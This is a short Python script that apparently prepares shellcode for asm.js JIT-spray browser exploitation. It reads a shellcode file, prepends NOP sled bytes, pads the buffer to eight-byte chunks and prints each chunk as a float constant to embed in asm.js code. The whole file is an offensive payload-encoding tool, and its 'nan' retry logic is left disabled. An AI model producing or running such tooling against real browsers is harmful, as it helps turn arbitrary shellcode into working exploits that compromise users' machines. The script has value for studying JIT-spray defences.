import struct
import sys
from binascii import hexlify, unhexlify
from struct import pack, unpack 

if len(sys.argv) < 3:
    print("... usage: <input shellcode file> <NOP pre-pad count>")
    exit(0)
    
InputPayloadFile = open(sys.argv[1], "rb")
buf = InputPayloadFile.read()
InputPayloadFile.close()
Finished = False
NopCount = int(sys.argv[2])
    
while Finished == False:
    Finished = True
    
    for i in range(NopCount):
        buf = "\x90" + buf
        
    while len(buf) % 8 != 0:
        buf += "\x00"
    
    float_chunks = [buf[i:i+8].encode("hex") for i in range(0, len(buf), 8)]
    asm_js_payload = [struct.unpack('<d', chunk.decode("hex")) for chunk in float_chunks]
    asm_js_payload = [str(flt)[1:-2] for flt in asm_js_payload]
    X = 1

    for i in range(len(asm_js_payload)):
        if asm_js_payload[i] == 'nan':
            print("... fatal error at offset of non-flat convertable sequence: " + str(hex(i * 8)))
            #Finished = False
            NopCount += 1
         
    if Finished == True:
        for Float in asm_js_payload:
            print("S" + str(X) + " = " + Float + ";")
            X += 1